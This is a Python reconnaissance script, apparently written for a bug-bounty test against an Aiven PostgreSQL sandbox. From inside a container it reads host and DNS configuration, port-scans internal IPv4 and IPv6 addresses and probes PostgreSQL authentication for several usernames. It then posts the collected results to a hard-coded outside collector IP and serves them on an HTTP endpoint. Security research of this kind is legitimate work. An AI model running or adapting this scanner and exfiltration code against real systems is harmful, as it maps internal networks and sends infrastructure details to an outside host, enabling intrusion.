#!/usr/bin/env python3
"""probe8 - verification pass. Prove the observation channel, then re-test the internal addresses.

probe7's IPv4 legs returned "0 ports answering" in 0 seconds *including* the public endpoint that other
containers reached fine. That smells like a broken channel (no IPv4 route in this container / instant
ENETUNREACH), not a closed target, and probe7 only recorded IPv6 facts so the claim could not be checked
from its own output. This pass records both address families and the exact error for every connect, and
tests a known-good control first.

Small and fast: a handful of ports, not a range sweep.
"""
from __future__ import annotations

import errno
import json
import os
import socket
import ssl
import struct
import subprocess
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

COLLECTOR = "http://208.87.134.252:9200/rt8"
HOSTS = [
    ("public(control)", "193.122.235.156"),
    ("v4-internal", "10.1.8.115"),
    ("ula-internal", "fda7:a938:5bfe:5fa6:0:5e9:cd8f:2191"),
]
PORTS = [22, 80, 443, 5432, 12691, 12692, 8080, 21911, 21912, 9701, 9680, 9955]
RESULTS = {"stage": "init", "tcp": {}, "pg": {}, "facts": {}, "notes": []}


def sh(cmd, t=8):
    try:
        r = subprocess.run(["/bin/sh", "-c", cmd], capture_output=True, text=True, timeout=t)
        return (r.stdout + r.stderr).strip()[:700]
    except Exception as e:                                              # noqa: BLE001
        return "ERR %s" % e


def sc(s):
    return "-" if str(s).startswith("_") else s


def tcp(host, port, timeout=4.0):
    fam = socket.AF_INET6 if ":" in host else socket.AF_INET
    s = socket.socket(fam, socket.SOCK_STREAM)
    s.settimeout(timeout)
    t0 = time.time()
    try:
        s.connect((host, port))
        ms = int((time.time() - t0) * 1000)
        try:
            s.sendall(struct.pack("!ii", 8, 80877103))
            reply = s.recv(4)
        except Exception:                                               # noqa: BLE001
            reply = b""
        s.close()
        return {"state": "open", "ms": ms, "reply": reply[:8].decode("latin1", "replace")}
    except socket.timeout:
        return {"state": "timeout", "ms": int((time.time() - t0) * 1000)}
    except OSError as e:
        name = errno.errorcode.get(e.errno, "")
        return {"state": type(e).__name__ + ("/" + sc(name) if name else ""),
                "errno": e.errno, "ms": int((time.time() - t0) * 1000)}


def pg_auth(host, port, user):
    fam = socket.AF_INET6 if ":" in host else socket.AF_INET
    try:
        s = socket.socket(fam, socket.SOCK_STREAM)
        s.settimeout(6)
        s.connect((host, port))
        s.sendall(struct.pack("!ii", 8, 80877103))
        r = s.recv(1)
        mode = "no-tls"
        if r == b"S":
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname="falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com")
            mode = "tls"
        body = struct.pack("!i", 196610)
        for k, v in (("user", user), ("database", "defaultdb"),
                     ("application_name", "aiven-bugbounty/1.0 (Bugcrowd-zllr)")):
            body += k.encode() + b"\x00" + v.encode() + b"\x00"
        body += b"\x00"
        s.sendall(struct.pack("!i", len(body) + 4) + body)
        for _ in range(4):
            h = s.recv(5)
            if len(h) < 5:
                s.close()
                return "%s: closed" % mode
            n = struct.unpack("!i", h[1:5])[0]
            p = b""
            while len(p) < n - 4:
                c = s.recv(n - 4 - len(p))
                if not c:
                    break
                p += c
            if h[:1] == b"R":
                code = struct.unpack("!i", p[:4])[0]
                s.close()
                return "%s: %s" % (mode, {0: "TRUST", 3: "CLEARTEXT", 5: "MD5", 10: "SCRAM"}.get(code, code))
            if h[:1] == b"E":
                m = p.split(b"M", 1)[1].split(b"\x00", 1)[0].decode("latin1") if b"M" in p else "?"
                s.close()
                return "%s: error %s" % (mode, m[:50])
            if h[:1] == b"v":
                continue
        s.close()
        return "%s: no auth message" % mode
    except Exception as e:                                              # noqa: BLE001
        return type(e).__name__


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(RESULTS, indent=1).encode())

    def log_message(self, *a):
        pass


threading.Thread(target=lambda: HTTPServer(("0.0.0.0", int(os.environ.get("PORT", "8080"))), H).serve_forever(),
                 daemon=True).start()
time.sleep(2)
RESULTS["facts"] = {
    "ip4": sh("ip -4 addr 2>/dev/null | grep inet"),
    "ip6": sh("ip -6 addr 2>/dev/null | grep inet6 | head -4"),
    "route4": sh("ip route 2>/dev/null"),
    "route6": sh("ip -6 route 2>/dev/null | head -8"),
    "hosts": sh("cat /etc/hosts"),
    "resolv": sh("cat /etc/resolv.conf"),
    "dns_internal_names": {},
}
for n in ("falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com",
          "public-replica-falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com",
          "replica-falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com",
          "n-falcon-bug-bounty-flag-pgsql-5.e.aivencloud.com",
          "public-n-falcon-bug-bounty-flag-pgsql-5.e.aivencloud.com",
          "dr-falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com"):
    try:
        RESULTS["facts"]["dns_internal_names"][n] = sorted({r[4][0] for r in socket.getaddrinfo(n, None)})
    except Exception as e:                                              # noqa: BLE001
        RESULTS["facts"]["dns_internal_names"][n] = type(e).__name__

for label, host in HOSTS:
    RESULTS["stage"] = "tcp " + label
    for port in PORTS:
        r = tcp(host, port)
        RESULTS["tcp"]["%s:%d" % (label, port)] = r
        if r["state"] == "open" and port not in (22, 80, 443, 8080):
            for user in ("avnadmin", "ctf", "postgres"):
                RESULTS["pg"]["%s:%d/%s" % (label, port, user)] = pg_auth(host, port, user)

RESULTS["stage"] = "done"
RESULTS["finished"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
body = json.dumps(RESULTS)
try:
    import urllib.request
    urllib.request.urlopen(urllib.request.Request(COLLECTOR, data=body.encode(),
                                                  headers={"Content-Type": "application/json"}), timeout=20)
except Exception as e:                                                  # noqa: BLE001
    print("collector post failed:", e)
print(json.dumps(RESULTS)[:2500])
while True:
    time.sleep(60)
